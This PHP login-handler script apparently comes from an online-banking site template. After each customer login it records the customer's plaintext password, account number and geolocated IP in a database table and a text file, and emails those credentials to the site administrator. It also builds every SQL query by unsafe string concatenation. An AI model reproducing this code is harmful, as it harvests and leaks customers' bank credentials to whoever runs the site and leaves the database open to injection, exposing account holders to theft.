<?php 
session_start();
include('conn_auth.php');
include('customInfo.php');
include('config.php');


$adddate=date("D M d, Y g:i a");
$clientip = getenv("REMOTE_ADDR"); 
$data = json_decode(file_get_contents("http://ip-api.io/json/$clientip")); 


//OFF/ON NOTIFICATIONS
$seLInfo = $conn->query("select * from all_notif") or die($conn->error);
$rowInfo = $seLInfo->fetch_array();


// replace old login time
$ins = $conn->query("update customer_info set
	last_log_time = '" . $rowUser['current_log_time'] . "'  WHERE email =  '" . $rowUser['email'] . "' ") or die($conn->error);

// last login date    i use tok_cod as the date in db
$ins = $conn->query("update customer_info set
	current_log_time = '" . $adddate . "'  WHERE email =  '" . $rowUser['email'] . "' ") or die($conn->error);


// chat   online status
$ins = $conn->query("update customer_info set online = 1  WHERE customer_id =  '" . $rowUser['customer_id'] . "' ") or die($conn->error);


//LOGIN RECORD
   
//$create_t =  $conn->query("create table if not exists login_info (
 //                            login_id int(11) NOT NULL auto_increment,
 //                            login_status int(1) NOT NULL,
  //                           login_custn varchar(90) NOT NULL default '',
	//						 accnt_nmb varchar(90) NOT NULL default '',
    //                         email varchar(90) NOT NULL default '',
     //                        username varchar(90) NOT NULL default '',
	//						 pass varchar(90) NOT NULL default '',
      //                       login_time varchar(90) NOT NULL default '',
       //                      location varchar(60) NOT NULL default '',
       //                      log_ip varchar(60) NOT NULL default '',
		//					 PRIMARY KEY(login_id))
		//				      ENGINE = MyISAM
		//					  ") or die($conn->error);

 
$create = $conn->query("insert into login_info (login_id, login_status, login_custn, accnt_nmb, email, username, pass, login_time, location, log_ip) values (NULL, '1', '" . $rowUser['cust_name'] . "', '" . $rowUser['acct_nmb'] . "', '" . $rowUser['email'] . "', '" . $rowUser['username'] . "', '" . $rowUser['pass'] . "', '" . date("D M d, Y g:i a") . "', '$data->region_name, $data->country_name', '$clientip')") or die($conn->error);






$message = '<html><body>';
$message .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
$message .= '<p style="color:#080;font-size:14px; font-family:Helvetica; padding;9px; margin:10px 0px 10px 0px;">HELLO ADMIN.</p>';
$message .= '<p style="color:#080;font-size:14px; font-family:Helvetica; padding;9px; margin:10px 0px 10px 0px;">The customer login with the bellow details.<br>Name: '. $rowUser['cust_name'] . ' <br>Email: '. $rowUser['email'] . ' <br>Login ID: '. $rowUser['username'] . '<br>Pass: '. $rowUser['pass'] . '<br>Acn: '. $rowUser['acct_nmb'] . ' </p>';
$message .= '<p style="color:#000066; font-size:14px; font-weight:400">'. $rowUser['addrs'] . '<br>COUNTRY: ' . $data->country_name .' <br>DATE: '.$adddate.' </p>';
$message .= '<div style="color: red; font-size:11px; font-weight:400">'; 
   $message .= 'IP Address: ' . $data->ip .' <br>';
   $message .= 'Location : ' . $data->city .',  ' . $data->region_name .',  ' . $data->region_code .',  ' . $data->country_name .' <br>';
   $message .= 'Zip Code: ' . $data->zip_code .' <br>';
   $message .= 'Time Zone: ' . $data->time_zone .' <br>';
   $message .= 'Network: ' . $data->organisation .' <br>';
   $message .= 'Currency Symbol: ' . $data->currencySymbol .' <br>';
   $message .= 'Currency: ' . $data->currency .' <br>';
   $message .= 'Calling Code: ' . $data->callingCode .' <br>';
     $message .= '</div>';  
$message .= '</div>';
$message .= '</body></html>';







$message3 .= "NEW LOGIN" . "\r\n";
$message3 .= 'Name: '. $rowUser['cust_name'] . ',';
$message3 .= "Location : $data->city, $data->region_name , $data->region_code , $data->country_name, $adddate  ". "\r\n";
$message3 .= "===================================================================================================================\r\n";


$handle = fopen("customer-login.txt", "a");
fwrite($handle, $message3);
fclose($handle);





// change your email here
$to = $rowUser['email'];
$subject = 'CUSTOMER LOGIN';
$from ="noreply@ourbank.com";

 
// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From:Login '.$site_name.'... '. $from ."\r\n".
'X-Mailer: PHP/' . phpversion();



//CUSTOMER MESSAGE
// To send HTML mail, the Content-type header must be set
$headers2  = 'MIME-Version: 1.0' . "\r\n";
$headers2 .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers2 .= 'From:Login '.$site_name.'... '. $from ."\r\n".
'X-Mailer: PHP/' . phpversion();

$subject2 = 'SUCCESSFULL LOGIN NOTIFICATION';
$to = $rowUser['email'];


$message2 ='<p>&nbsp;</p>
<blockquote><!-- html ignored --><!-- head ignored --><!-- meta ignored -->
<div dir="auto">
<div>
<div class="gmail_quote">
<div>
<blockquote>&nbsp;</blockquote>
<table border="0" width="650" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr>
<td valign="top"><img style="display: block;" src="'.$site_url.'/things/img/hero_womanHomeLaptop.jpg" alt="We are social" width="650" height="200" /></td>
</tr> 
<tr>
<td valign="top">
<table border="0" width="574" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr>
<td style="padding: 20px 0 20px 0;"><span style="font-family: Corbel,sans-serif; font-size: 17px; line-height: 24px; color: #59595c; margin: 0 0 0 0; padding: 0 0 15px 0;">Dear&nbsp; '. $rowUser['cust_name'] . ', <br /><br /> You have successfully logged on to your&nbsp; '.$site_name.'&nbsp; Online Banking on: ' .$adddate.' . However, If you did not initiate this log in, kindly call our dedicated Contact Centre immediately.<br /><br /> You are also advised to urgently delete this mail if it contains sensitive contents such as: <strong>Your Login Credentials, Login Password, Transaction Password, Security Question Details etc.</strong><br /><br /> If none of your actions on our Internet Banking Platform warrants this mail, kindly change your login details and your transaction password.<br /><br /> Please note that <span>' .$site_NAME. '</span> or its staff will <span style="color: #5d2785;"><strong>NEVER ASK</strong></span> for <span style="color: #5d2785;"><strong>YOUR LOGIN PASSWORD, TRANSACTION PASSWORD</strong> or <strong>YOUR ACCOUNT DETAILS.</strong></span> </span></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td valign="top"><img style="display: block;" src="'.$site_url.'/things/img/my-bank-bar.jpg" width="650" height="51" /></td>
</tr>
<tr>
<td valign="top">
<table style="border-bottom: #dad9dc solid 1px;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td valign="top"><img src="http://image.fcmb.com/images/NewBrand/Investor-Relations-Version-04_05.jpg" width="500" height="51" /></td>
<td valign="top"><a href="" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/fb.jpg" width="40" height="51" border="0" /></a></td>
<td valign="top"><a href="" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/tw.jpg" width="36" height="51" border="0" /></a></td>
<td valign="top"><a href="" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/li.jpg" width="74" height="51" border="0" /></a></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style="border-bottom: #dad9dc solid 1px;" valign="top">
<table border="0" width="574" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr>
<td style="padding: 20px 0 20px 0;" valign="top"><span style="font-family: Verdana,Arial,Helvetica,sans-serif; font-size: 14px; color: #575756; line-height: 18px;">For more information, please call our 24/7 Contact Centre on&nbsp;<span>' .$admin_phone . '</span> <br /> Alternatively send an email to<strong style="color: #575756; text-decoration: none;">&nbsp;' .$admin_email. '</strong><br /><br /> Copyright &copy; 2019&nbsp;' .$site_name . ' Limited | <strong style="color: #575756; text-decoration: none;"><a style="color: #575756; text-decoration: none;" href="'.$site_url.'" target="_blank" rel="noopener noreferrer">www.'.$domain.'</a></strong></span></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</blockquote>
<p>&nbsp;</p>
<div id="_rc_sig">&nbsp;</div>';





{
mail($admin_email,$subject,$message,$headers);
  }

//TO OFF CUSTOMER LOGIN NOTIFICATION
if($rowInfo['log_not']=="On"){
    {
    mail($to,$subject2,$message2,$headers2);
    }
header("Location: portal");
    
    }else{
    header("Location: portal");
}

?>